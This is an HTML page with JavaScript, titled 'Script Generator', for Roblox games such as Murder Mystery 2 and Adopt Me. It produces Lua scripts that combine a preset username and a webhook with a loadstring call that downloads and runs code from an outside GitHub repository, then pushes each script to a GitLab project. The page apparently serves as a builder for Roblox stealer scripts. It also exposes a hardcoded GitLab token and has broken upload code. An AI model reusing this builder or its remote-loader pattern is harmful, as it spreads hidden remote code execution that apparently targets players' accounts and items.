<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Script Generator</title>
    <style>
        body {
            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            margin: 0;
        }
        h1 {
            font-size: 3rem;
        }
        .container {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-top: 20px;
            text-align: center;
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }
        input, select, button {
            padding: 10px;
            border-radius: 8px;
            border: none;
            background-color: #333;
            color: white;
            font-size: 1rem;
            width: 250px;
        }
        button {
            background: #ff0080;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover {
            background: #ff0055;
            transform: scale(1.1);
        }
    </style>
</head>
<body>
    <h1>Script Generator</h1>
    <div class="container">
        <input type="text" id="username" placeholder="Enter your Username" value="void6674109">
        <input type="text" id="webhook" placeholder="Enter Webhook URL">
        <input type="text" id="pat" placeholder="Enter GitLab PAT">
        <input type="text" id="scriptname" placeholder="Enter Script Name">
        <select id="script-select">
            <option value="Blox Fruits">Blox Fruits</option>
            <option value="Murder Mystery 2">Murder Mystery 2</option>
            <option value="Adopt Me">Adopt Me</option>
            <option value="Pet Simulator 99">Pet Simulator 99</option>
            <option value="Pls Donate">Pls Donate</option>
        </select>
        <button onclick="generateScript()">Generate & Upload</button>
    </div>

    <script>
        // Script URLs for different games
        let loadstrings = {
            "Blox Fruits": "https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits",
            "Murder Mystery 2": "https://raw.githubusercontent.com/Goldded/Void2/main/Void",
            "Adopt Me": "https://raw.githubusercontent.com/Goldded/Void2/main/AdoptMe",
            "Pet Simulator 99": "https://raw.githubusercontent.com/Goldded/Void2/main/Ps99",
            "Pls Donate": "https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate"
        };

        // Main generate script function
        function generateScript() {
            let username = document.getElementById('username').value;
            let webhook = document.getElementById('webhook').value;
            let pat = document.getElementById('pat').value;
            let scriptName = document.getElementById('scriptname').value;
            let selectedScript = document.getElementById('script-select').value;

            if (!username || !webhook || !pat || !scriptName) {
                alert("Please fill out all fields!");
                return;
            }

            // ✅ Script format as requested
            let script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet("${loadstrings[selectedScript]}"))()`;

            // Upload to GitLab
            uploadToGitLab(script, scriptName, pat);
        }

        // GitLab Upload Function
        function uploadToGitLab(content, scriptName, pat) {
            let projectID = '67450323'; // ✅ Your GitLab Project ID
            let filename = `${scriptName}.lua`; // File name in GitLab

            fetch(`https://gitlab.com/api/v4/projects/${encodeURIComponent(projectID)}/repository/files/${encodeURIComponent(filename)}`, {
                method: 'POST',
                headers: {
                    'glpat-8si5orFgbXbJE4uzHwKS': pat, // ✅ Correct header for PAT
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    branch: 'main', // Ensure 'main' exists
                    content: btoa(content), // Encode script to base64
                    commit_message: 'Add new script'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.file_path) {
                    alert("✅ Script uploaded successfully to GitLab!");
                } else {
                    alert("❌ Failed to upload. Check your PAT and Project ID.");
                }
            })
            .catch(error => {
                console.error('Error uploading:', error);
                alert("⚠️ Error uploading script! Check console for details.");
            });
        }
    </script>

</body>
</html>
